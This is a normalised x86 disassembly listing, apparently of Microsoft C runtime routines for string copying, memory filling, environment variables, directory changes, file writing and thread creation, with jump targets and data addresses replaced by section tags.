inc esi
inc esi
movzx ecx [ esi ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
sub_412cfe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
inc eax
inc eax
xor eax eax
sub_412d24
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
mov edx eax
je r-xdata
push esi
mov esi [ ebp + 0xc ]
inc edx
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx ecx [ esi ]
mov [ edx ] cx
inc edx
inc edx
inc esi
inc esi
test cx cx
jne r-xdata
pop esi
pop ebp
retn
sub_412d52
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
mov [ ecx ] ax
inc ecx
inc ecx
inc edx
inc edx
test ax ax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_412d97
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_41c12a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41226d
pop ecx
sub_412ddb
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_412584
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_41b47f
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_412dbe
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_41c19f
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_412d71
push sub_426fef
call sub_411936
pop ecx
sub_412e40
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_412ecb
push 0xc
push r--data
call sub_4183f0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_41360f
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_413727
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_41360f
add eax ebx
push eax
call sub_41c1eb
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_41360f
add eax ebx
push eax
call sub_419285
mov [ ebp - 0x1c ] eax
call sub_41360f
add eax ebx
push eax
push edi
call sub_41c287
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_412f67
mov eax [ ebp - 0x1c ]
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_418435
retn
sub_412f80
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_41c312
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_412ffa
mov edi edi
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
or [ ebp - 0x21c ] 0xffffffff
push ebx
xor ebx ebx
push esi
lea esi [ ebp - 0x218 ]
mov [ ebp - 0x220 ] ebx
cmp eax ebx
jne r-xdata
push edi
push eax
call [ SetCurrentDirectoryW@IAT ]
test eax eax
je r-xdata
call sub_4119ce
mov [ eax ] ebx
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4119e1
pop ecx
lea eax [ ebp - 0x218 ]
push eax
push 0x105
call [ GetCurrentDirectoryW@IAT ]
mov edi eax
cmp edi 0x104
jle r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
mov eax [ ebp - 0x21c ]
push esi
call sub_4121b5
pop ecx
cmp edi ebx
je r-xdata
lea ebx [ edi + 0x1 ]
push 0x2
push ebx
call sub_4186b7
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
movzx eax [ esi ]
cmp ax 0x5c
je r-xdata
xor ebx ebx
mov [ ebp - 0x220 ] 0x1
test edi edi
je r-xdata
cmp ax [ esi + 0x2 ]
je r-xdata
cmp ax 0x2f
jne r-xdata
push esi
push ebx
call [ GetCurrentDirectoryW@IAT ]
mov edi eax
xor ebx ebx
mov [ ebp - 0x21c ] ebx
jmp r-xdata
push 0x3d
pop eax
mov [ ebp - 0xc ] ax
movzx eax [ esi ]
push eax
call sub_41c515
pop ecx
push 0x3a
mov [ ebp - 0xa ] ax
pop eax
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0x6 ] ax
push esi
lea eax [ ebp - 0xc ]
push eax
call [ SetEnvironmentVariableW@IAT ]
test eax eax
je r-xdata
pop edi
cmp [ ebp - 0x220 ] ebx
je r-xdata
sub_413148
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
mov [ ebp - 0x8 ] esi
cmp [ rw-data ] esi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
cmp [ ebp + 0xc ] esi
jne r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
mov edi 0x7fff
push edi
push ebx
call sub_41cf79
push edi
push [ ebp + 0xc ]
mov ebx eax
call sub_41cf79
add esp 0x10
cmp ebx edi
jae r-xdata
push 0x3d
push ebx
call sub_41d052
pop ecx
pop ecx
cmp eax esi
je r-xdata
pop ebx
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax edi
jb r-xdata
push ebx
call sub_412e40
mov edi eax
inc edi
push 0x1
push edi
call sub_4186b7
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
mov ecx eax
sub ecx ebx
mov edi 0x7fff
cmp ecx edi
jge r-xdata
or eax 0xffffffff
jmp r-xdata
lea edi [ eax + ebx + 0x2 ]
push 0x1
push edi
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push ebx
push edi
push eax
call sub_41cf11
add esp 0xc
jmp r-xdata
inc eax
push edi
push eax
call sub_41cf79
pop ecx
pop ecx
cmp eax edi
jae r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_41cf11
mov eax [ ebp - 0x8 ]
push [ ebp + 0xc ]
mov [ ebx + eax ] 0x3d
mov eax [ ebp - 0x8 ]
inc ebx
sub edi ebx
add ebx eax
push edi
push ebx
call sub_41cf11
mov ebx [ ebp + 0x8 ]
add esp 0x18
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41ccc6
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp [ ebp - 0x8 ] esi
je r-xdata
xor eax eax
mov edi [ MultiByteToWideChar@IAT ]
push esi
push esi
push 0xffffffff
push ebx
push esi
push esi
mov [ ebp - 0x4 ] esi
call edi
mov ebx eax
cmp ebx esi
je r-xdata
push [ ebp - 0x8 ]
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x2a
jmp r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_4121b5
pop ecx
push 0x2
push ebx
call sub_4186b7
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
push esi
push esi
push 0xffffffff
push [ ebp + 0xc ]
push esi
push esi
call edi
cmp eax esi
je r-xdata
push ebx
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push esi
push esi
call edi
test eax eax
je r-xdata
lea ebx [ ebx + eax + 0x1 ]
push [ ebp - 0x4 ]
call sub_4121b5
pop ecx
cmp [ ebp + 0xc ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_41c8b7
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_411794
mov edx [ ebp - 0x4 ]
pop ecx
push 0x3d
pop ecx
mov [ edx + eax * 2 ] cx
mov ecx [ ebp - 0x4 ]
inc eax
sub ebx eax
push ebx
lea eax [ ecx + eax * 2 ]
push eax
push 0xffffffff
push [ ebp + 0xc ]
push esi
push esi
call edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push [ ebp - 0x4 ]
sub_41335a
push 0xc
push r--data
call sub_4183f0
push 0x7
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_413148
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413396
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_41339f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_412e40
pop ecx
mov edi eax
jmp r-xdata
call sub_41d171
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_412e40
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_41d157
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_413426
push 0x10
push r--data
call sub_4183f0
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi 0x7fff
push edi
push [ ebp + 0x8 ]
call sub_41cf79
pop ecx
pop ecx
cmp eax edi
sbb eax eax
neg eax
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
push 0x7
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_41339f
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4134a0
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_4134a9
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edi
test ecx ecx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
test ecx ecx
je r-xdata
dec ecx
jne r-xdata
dec ecx
je r-xdata
movzx eax [ edx ]
mov [ edi ] ax
inc edi
inc edi
inc edx
inc edx
test ax ax
je r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_4134f3
push 0xc
push r--data
call sub_4183f0
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_418435
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_41b3c1
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413605
mov eax [ ebp - 0x1c ]
push ebx
call sub_41c1eb
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_41d2ee
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_41c287
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_413615
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4186b7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_4186b7
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_4136e6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_419f99
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_413727
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_419f99
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_413759
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_419ebf
pop ecx
pop ebp
retn
sub_413795
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_419ebf
pop ecx
pop ebp
retn
sub_4137d0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4137fb
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_418001
test eax eax
je r-xdata
push r--data
call sub_41dfd0
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_4181c3
pop ecx
call [ r--data ]
sub_413879
mov edi edi
push ebp
mov ebp esp
push esi
call sub_417e8c
call sub_417e86
push eax
call sub_417e6c
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_418094
mov esi [ ebp + 0x8 ]
push esi
call sub_417e86
push eax
call sub_417ec0
test eax eax
jne r-xdata
call sub_413838
push r--data
call sub_41dfd0
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_4138fc
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_417e8c
push 0x214
push 0x1
call sub_4186b7
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_4121b5
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_41807a
push [ eax + 0x6c ]
push esi
call sub_417f1a
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_4119e1
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_413879
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_4139ac
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_419079
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_415bbb
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_41b3c1
pop ecx
push eax
call sub_41e7c0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_416940
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_413b0e
push 0xc
push r--data
call sub_4183f0
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_4136e6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4139ac
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413b86
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_41897d
add esp 0x14
call sub_418435
retn
sub_413b90
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push edi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_41d2ee
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_4119bb
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
dec [ ebp - 0x1c ]
js r-xdata
pop esi
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_419079
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax edi
sub_413c60
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_413d20
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_413ec7
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
